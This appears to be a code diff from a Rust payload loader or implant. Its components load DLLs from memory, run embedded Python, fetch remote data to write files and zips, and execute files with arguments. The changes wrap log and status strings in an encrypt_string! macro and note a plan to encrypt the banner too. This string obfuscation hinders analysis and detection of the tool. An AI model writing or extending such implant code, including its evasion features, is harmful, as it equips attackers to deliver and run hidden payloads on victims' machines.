@@ -35,6 +35,7 @@ use crate::payload_util::create_diretory;
 use crate::payload_util::same_hash_sha512;
 #[cfg(target_os = "linux")]
 use crate::payload_util::set_permission;
+use crate::payload_util::fail_linux_message;
 
 pub enum PayloadExec {
     NoThread(),
@@ -85,7 +86,7 @@ impl Payload {
     ) -> bool {
         for running_payload in &mut *running_thread {
             if self.is_same_payload(&running_payload.1) {
-                info!("Payload is already running");
+                info!("{}",encrypt_string!("Payload is already running"));
                 return true;
             }
         }
@@ -103,7 +104,7 @@ pub struct DllFromMemory {
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
     pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
-        error!("Its linux, impossible to run this payload: dll_from_memory");
+        fail_linux_message(format!("{}",encrypt_string!("DllFromMemory")));
         Ok(PayloadExec::NoThread())
     }
 
@@ -168,10 +169,7 @@ pub struct ExecPython {
 impl ExecPython {
     #[cfg(target_os = "linux")]
     pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
-        error!(
-            "{}",
-            encrypt_string!("!Its linux, impossible to run this payload: deploy_embedder")
-        );
+        fail_linux_message(format!("{}",encrypt_string!("ExecPython")));
         Ok(PayloadExec::NoThread())
     }
 
@@ -199,6 +197,7 @@ impl ExecPython {
 }
 
 pub fn banner() -> Result<PayloadExec, anyhow::Error> {
+    //TODO encrypt this str
     let banner: &str = r#"
                                  ╓╖
                          , ▒╗,  ▒▒▒▒╖   ╓▒▒
@@ -248,7 +247,7 @@ impl WriteZip {
 
         let archive: Vec<u8> = self.link.fetch_data()?;
 
-        info!("[+] Write zip: {:?}", path);
+        info!("{}{:?}",encrypt_string!("[+] Write zip: "), path);
         match zip_extract::extract(Cursor::new(archive), &path, true) {
             Ok(_) => {}
             Err(error) => {
@@ -280,11 +279,11 @@ impl WriteFile {
 
             let body: Vec<u8> = self.link.fetch_data()?;
 
-            info!("[+] Write file: {:?}", path);
+            info!("{}{:?}",encrypt_string!("[+] Write file: "), path);
             let mut f = File::create(&path)?;
             f.write_all(&body)?;
         } else {
-            info!("[+] No Write, same hash: {:?}", path);
+            info!("{}{:?}",encrypt_string!("[+] No Write, same hash: "), path);
         }
         Ok(PayloadExec::NoThread())
     }
@@ -300,7 +299,7 @@ impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
     pub fn exec_file(&self) -> Result<PayloadExec, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
-        info!("Exec {:?} {}", &path, &self.cmdline);
+        info!("{}{:?} {}",encrypt_string!("Exec "), &path, &self.cmdline);
         let mut comm = Command::new(&path);
 
         #[cfg(target_os = "linux")]
